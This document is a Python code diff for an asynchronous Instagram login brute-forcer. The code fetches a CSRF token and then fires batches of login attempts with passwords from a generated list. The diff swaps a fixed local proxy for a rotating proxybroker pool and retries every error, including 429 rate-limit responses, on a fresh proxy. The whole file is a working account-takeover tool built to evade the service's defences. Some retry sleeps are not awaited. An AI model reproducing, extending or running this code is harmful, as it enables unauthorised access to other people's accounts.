@@ -5,20 +5,15 @@ import aiohttp
 
 from itertools import islice
 import random
+from urllib.parse import urlparse
+
+from proxybroker.errors import NoProxyError
 
 from app import settings
 from app.lib import exceptions
 from app.logging import AppLogger, contextual_log
-from app.lib.utils import get_token_from_response, cancel_remaining_tasks
+from app.lib.utils import get_token_from_response, create_url
 from app.lib.models import InstagramResult, LoginAttemptContext, LoginContext, TokenContext
-
-
-host, port = '127.0.0.1', 8888  # by default
-PROXY_URL = 'http://%s:%d' % (host, port)
-PROXY_GET_URL = 'http://%s:%d' % (host, 8881)
-
-from app.lib.models import Proxy
-PROXY = Proxy(host=host, port=port)
 
 
 def limited_as_completed(coros, limit):
@@ -47,12 +42,9 @@ def limited_as_completed(coros, limit):
 
 class request_handler(object):
 
-    def __init__(self, config, proxy_handler):
+    def __init__(self, config):
         self.config = config
-
         self.user_agent = random.choice(settings.USER_AGENTS)
-        self.stop_event = asyncio.Event()
-        self.proxy_handler = proxy_handler
 
     def _headers(self):
         headers = settings.HEADER.copy()
@@ -83,102 +75,97 @@ class request_handler(object):
 
 class token_handler(request_handler):
 
+    log = AppLogger('Sending Token Request')
+
     def _get_token_from_response(self, response):
         token = get_token_from_response(response)
         if not token:
             raise exceptions.TokenNotInResponse()
         return token
 
-    @contextual_log
-    async def request(self, session, context, retry=1):
-        log = AppLogger('Sending Token Request')
+    def _notify_request(self, context, retry=1):
+        message = 'Sending GET Request'
+        if retry != 0:
+            message = f'Sending GET Request, Retry {retry + 1}'
+        self.log.info(message, extra={'context': context})
 
-        if retry != 1:
-            log.info(f'Sending GET Request, Retry {retry}', extra={'context': context})
-        else:
-            log.info('Sending GET Request', extra={'context': context})
+    async def fetch(self, session, proxy_pool):
+        """
+        TODO:
+        -----
 
-        async def handle_retry(e, time=1):
+        Maybe incorporate some sort of max-retry on the attempts so that we dont
+        accidentally run into a situation of accumulating a lot of requests.
 
-            if self.config.max_retries and retry < self.config.max_retries:
-                log.warning(e, extra={'context': context})
-                log.warning(f'Sleeping for {time} Seconds...')
-                await asyncio.sleep(time)
-                return await self.request(session, context, retry=retry + 1)
-            else:
-                log.error(e, extra={'context': context})
-                return None
+        For certain exceptions we may want to reintroduce the sleep/timeout,
+        but it might be faster to immediately just go to next proxy.
+        """
+        async def try_with_proxy(attempt=0):
+            try:
+                proxy = await proxy_pool.get(scheme=urlparse(settings.INSTAGRAM_URL).scheme)
+                context = TokenContext(index=attempt, proxy=proxy.__dict__.copy())
+                self._notify_request(context, retry=attempt)
 
-        try:
-            async with session.get(
-                settings.INSTAGRAM_URL,
-                raise_for_status=True,
-                headers=self._headers(),
-                timeout=self.config.fetch_time,
-                proxy=PROXY_GET_URL,
-            ) as response:
                 # Raise for status is automatically performed, so we do not have
                 # to have a client response handler.
-                try:
-                    token = self._get_token_from_response(response)
-                except exceptions.TokenNotInResponse as e:
-                    log.warning(e, extra={'context': context})
-                    return None
-                else:
-                    # await self.proxy_handler.add_good(context.proxy)
-                    return token
+                async with session.get(
+                    settings.INSTAGRAM_URL,
+                    raise_for_status=True,
+                    headers=self._headers(),
+                    proxy=create_url(proxy.host, proxy.port),
+                ) as response:
+                    try:
+                        token = self._get_token_from_response(response)
+                    except exceptions.TokenNotInResponse as e:
+                        self.log.warning(e, extra={'context': context})
+                        return await try_with_proxy(attempt=attempt + 1)
+                    else:
+                        proxy_pool.put(proxy)
+                        return token
 
-        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
-            return await handle_retry(e, time=3)
+            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
+                return await try_with_proxy(attempt=attempt + 1)
 
-        except aiohttp.ClientError as e:
-            log.error(e, extra={'context': context})
-            return None
+            except aiohttp.ClientError as e:
+                self.log.error(e, extra={'context': context})
+                return await try_with_proxy(attempt=attempt + 1)
 
-        except asyncio.CancelledError:
-            return None
+            except asyncio.CancelledError:
+                return
 
-        except (TimeoutError, asyncio.TimeoutError) as e:
-            log.error(e, extra={'context': context})
-            return await handle_retry(e, time=3)
+            except NoProxyError:
+                self.log.error('Waiting on proxies...')
+                asyncio.sleep(3)
+                return await try_with_proxy(attempt=attempt + 1)
 
-    async def fetch(self):
-        """
-        Asyncio Docs:
+            except (TimeoutError, asyncio.TimeoutError) as e:
+                self.log.error(e, extra={'context': context})
+                return await try_with_proxy(attempt=attempt + 1)
 
-        asyncio.as_completed
+            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
+            # Some error with proxybroker and how it is handling the Queue/ProxyPool.
+            except TypeError:
+                self.log.error('Having trouble putting proxy in queue.')
+                return await try_with_proxy(attempt=attempt + 1)
 
-            Run awaitable objects in the aws set concurrently. Return an iterator
-            of Future objects. Each Future object returned represents the earliest
-            result from the set of the remaining awaitables.
+        return await try_with_proxy()
 
-            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.
-        """
-        tasks = []
-        index = 0
+    async def wait_for_token(self, loop, proxy_pool):
 
         async with aiohttp.ClientSession(
             connector=self.connector,
             timeout=self.timeout
         ) as session:
-            while index < self.config.token_attempt_limit:
-                # proxy = await self.proxy_handler.get_best()
-                context = TokenContext(proxy=PROXY, index=index)
-                index += 1
-
-                task = asyncio.ensure_future(self.request(session, context))
-                tasks.append(task)
-
-            # TODO: Incorporate some type of timeout as an edge cases if None of the
-            # futures are finishing.
-            for future in asyncio.as_completed(tasks, timeout=None):
-                earliest_future = await future
-                if earliest_future:
-                    await cancel_remaining_tasks(tasks)
-                    return earliest_future
+            task = asyncio.ensure_future(self.fetch(session, proxy_pool))
+            token = await task
+            if not token:
+                raise exceptions.FatalException("Token should be non-null here.")
+            return token
 
 
 class login_handler(request_handler):
+
+    log = AppLogger('Login Request')
 
     def _login_data(self, password):
         return {
@@ -190,6 +177,12 @@ class login_handler(request_handler):
         headers = super(login_handler, self)._headers()
         headers[settings.TOKEN_HEADER] = token
         return headers
+
+    def _notify_request(self, context, retry=1):
+        message = 'Sending POST Request'
+        if retry != 1:
+            message = f'Sending POST Request, Retry {retry}'
+        self.log.info(message, extra={'context': context})
 
     async def _get_result_from_response(self, response, context):
         try:
@@ -244,168 +237,144 @@ class login_handler(request_handler):
                 raise exceptions.InstagramResultError("Inconslusive result.")
             return result
 
-    @contextual_log
-    async def request(self, session, context, retry=1):
+    async def fetch(self, session, proxy_pool, parent_context):
         """
         NOTE
         ----
-        Once we get contextual_log working, we shouldn't have to keep manually
-        supplying the context to all the log calls.
 
         Do not want to automatically raise for status because we can have
         a 400 error but enough info in response to authenticate.
 
         Also, once response.raise_for_status() is called, we cannot access
         the response.json().
+
+        TODO:
+        -----
+
+        Maybe incorporate some sort of max-retry on the attempts so that we dont
+        accidentally run into a situation of accumulating a lot of requests.
+
+        For certain exceptions we may want to reintroduce the sleep/timeout,
+        but it might be faster to immediately just go to next proxy.
         """
-        # Autologger not working because of keyword argument
-        log = AppLogger('Request')
+        async def try_with_proxy(attempt=0):
+            try:
+                proxy = await proxy_pool.get(scheme=urlparse(settings.INSTAGRAM_LOGIN_URL).scheme)
+                context = LoginAttemptContext(
+                    index=attempt,
+                    proxy=proxy.__dict__.copy(),
+                    parent_index=parent_context.index,
+                    password=parent_context.password,
+                    token=parent_context.token
+                )
+                self._notify_request(context, retry=attempt)
 
-        if retry != 1:
-            log.info(f'Sending POST Request, Retry {retry}', extra={'context': context})
-        else:
-            log.info('Sending POST Request', extra={'context': context})
+                async with session.post(
+                    settings.INSTAGRAM_LOGIN_URL,
+                    headers=self._headers(context.token),
+                    proxy=create_url(proxy.host, proxy.port),
+                ) as response:
+                    # Only reason to log these errors here is to provide the response
+                    # object
+                    try:
+                        result = await self._handle_client_response(response, context)
+                        result = await self._handle_parsed_result(result, context)
 
-        async def handle_retry(e, time=1):
+                    except exceptions.ResultNotInResponse as e:
+                        self.log.error(e, extra={'response': response, 'context': context})
 
-            if self.config.max_retries and retry < self.config.max_retries:
-                log.warning(e, extra={'context': context})
-                log.warning(f'Sleeping for {time} Seconds...')
-                await asyncio.sleep(time)
-                return await self.request(session, context, retry=retry + 1)
-            else:
-                log.error(e, extra={'context': context})
-                # await self.proxy_handler.note_bad(context.proxy)
-                return None
+                    except exceptions.InstagramResultError as e:
+                        self.log.error(e, extra={'response': response, 'context': context})
 
-        try:
-            log.debug('Attempting Request')
-            async with session.post(
-                settings.INSTAGRAM_LOGIN_URL,
-                headers=self._headers(context.token),
-                data=self._login_data(context.password),
-                timeout=self.config.fetch_time,
-                proxy=PROXY_URL,
-            ) as response:
-                # Only reason to log these errors here is to provide the response
-                # object
-                try:
-                    log.debug('Handling Client Response')
-                    result = await self._handle_client_response(response, context)
-                    result = await self._handle_parsed_result(result, context)
+                    else:
+                        if not result:
+                            raise exceptions.FatalException("Result should not be None here.")
+                        proxy_pool.put(proxy)
+                        return result
 
-                except exceptions.ResultNotInResponse as e:
-                    log.error(e, extra={'response': response, 'context': context})
-                    # await self.proxy_handler.note_bad(context.proxy)
-                    return None
+            except RuntimeError as e:
+                """
+                RuntimeError: File descriptor 87 is used by transport
+                <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
+                """
+                self.log.error(e, extra={'context': context})
+                return await try_with_proxy(attempt=attempt + 1)
 
-                except exceptions.InstagramResultError as e:
-                    log.error(e, extra={'response': response, 'context': context})
-                    # await self.proxy_handler.note_bad(context.proxy)
-                    return None
+            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
+                self.log.warning(e, extra={'context': context})
+                return await try_with_proxy(attempt=attempt + 1)
 
+            except asyncio.TimeoutError as e:
+                self.log.warning(e, extra={'context': context})
+                return await try_with_proxy(attempt=attempt + 1)
+
+            except aiohttp.ClientConnectionError as e:
+                self.log.warning(e, extra={'context': context})
+                return await try_with_proxy(attempt=attempt + 1)
+
+            except OSError as e:
+                # We have only seen this for the following:
+                # >>> OSError: [Errno 24] Too many open files
+                # >>> OSError: [Errno 54] Connection reste by peer
+                # For the former, we want to sleep for a second, for the latter,
+                # we want to move on to a new proxy.
+                if e.errno == 54:
+                    self.log.error(e, extra={'context': context})
+                    return await try_with_proxy(attempt=attempt + 1)
+                elif e.errno == 24:
+                    asyncio.sleep(3)
+                    return await try_with_proxy(attempt=attempt + 1)
                 else:
-                    if not result:
-                        raise exceptions.FatalException("Result should not be None here.")
+                    raise e
 
-                    log.debug('Putting Proxy in Good Queue')
-                    # await self.proxy_handler.add_good(context.proxy)
-                    return result
+            except NoProxyError:
+                self.log.error('Waiting on proxies...')
+                asyncio.sleep(3)
+                return await try_with_proxy(attempt=attempt + 1)
 
-        except RuntimeError as e:
-            """
-            RuntimeError: File descriptor 87 is used by transport
-            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
-            """
-            log.error(e, extra={'context': context})
-            return await handle_retry(e, time=5)
+            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
+            # Some error with proxybroker and how it is handling the Queue/ProxyPool.
+            except TypeError:
+                self.log.error('Having trouble putting proxy in queue.')
+                return await try_with_proxy(attempt=attempt + 1)
 
-        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
-            return await handle_retry(e, time=3)
+            except asyncio.CancelledError as e:
+                pass
 
-        except asyncio.TimeoutError as e:
-            return await handle_retry(e, time=3)
+            except aiohttp.ClientError as e:
+                # For whatever reason these errors don't have any message...
+                if e.status == 429:
+                    e.message = 'Too many requests.'
+                self.log.error(e, extra={'context': context})
+                return await try_with_proxy(attempt=attempt + 1)
 
-        except aiohttp.ClientConnectionError as e:
-            log.error(e, extra={'context': context})
-            # await self.proxy_handler.note_bad(context.proxy)
-            return None
+        return await try_with_proxy()
 
-        except OSError as e:
-            # We have only seen this for the following:
-            # >>> OSError: [Errno 24] Too many open files
-            # >>> OSError: [Errno 54] Connection reste by peer
-            # For the former, we want to sleep for a second, for the latter,
-            # we want to move on to a new proxy.
-            if e.errno == 54:
-                log.error(e, extra={'context': context})
-                # await self.proxy_handler.note_bad(context.proxy)
-                return None
-            elif e.errno == 24:
-                return await handle_retry(e, time=3)
-            else:
-                raise e
-
-        except asyncio.CancelledError as e:
-            return None
-
-        except aiohttp.ClientError as e:
-            # TODO: For too many requests error, we should store proxy in back
-            # burner so that it can be used again.
-
-            # For whatever reason these errors don't have any message...
-            if e.status == 429:
-                e.message = 'Too many requests.'
-            log.error(e, extra={'context': context})
-            # await self.proxy_handler.note_bad(context.proxy)
-            return None
-
-    @contextual_log
-    async def attempt_login(self, session, context, results):
+    async def attempt_login(self, session, proxy_pool, token, password, results, index=0):
         """
         TODO
         -----
-        Should we incorporate some type of limit here, so that we don't wind
-        up trying to login with same password 100 times for safety?
+        Should we incorporate some type of time limit here for waiting to
+        get a valid response.
         """
-        log = AppLogger('Attempt')
 
-        index = 0
-        while True:
-            # proxy = await self.proxy_handler.get_best()
-            context = LoginAttemptContext(
-                index=index,
-                parent_index=context.index,
-                proxy=PROXY,
-                password=context.password,
-                token=context.token
-            )
-            index += 1
+        # Maybe we should just try to notify of attempts beginning for password
+        # instead of each individual attempt.
+        context = LoginContext(index=index, token=token, password=password)
+        result = await self.fetch(session, proxy_pool, context)
 
-            result = await self.request(session, context)
+        if result and result.conclusive:
+            self.log.debug('Got Conclusive Result')
+            return result
 
-            if result and result.conclusive:
-                log.debug('Got Conclusive Result')
-                return result
-
-    async def consume_passwords(self, loop, results, token):
+    async def consume_passwords(self, loop, proxy_pool, results, token):
         async with aiohttp.ClientSession(
             connector=self.connector,
             timeout=self.timeout
         ) as session:
             for res in limited_as_completed(
-                (self.attempt_login(
-                    session,
-                    LoginContext(
-                        index=i,
-                        token=token,
-                        password=password
-                    ),
-                    results
-                ) for i, password in enumerate(
-                    self.config.user.get_new_attempts(limit=self.config.password_limit)
-                )),
-                self.config.batch_size,
-            ):
+                (self.attempt_login(session, proxy_pool, token, password, results, index=i)
+                for i, password in enumerate(self.config.user.get_new_attempts(
+                    limit=self.config.password_limit))), self.config.batch_size):
                 result = await res
                 await results.put(result)
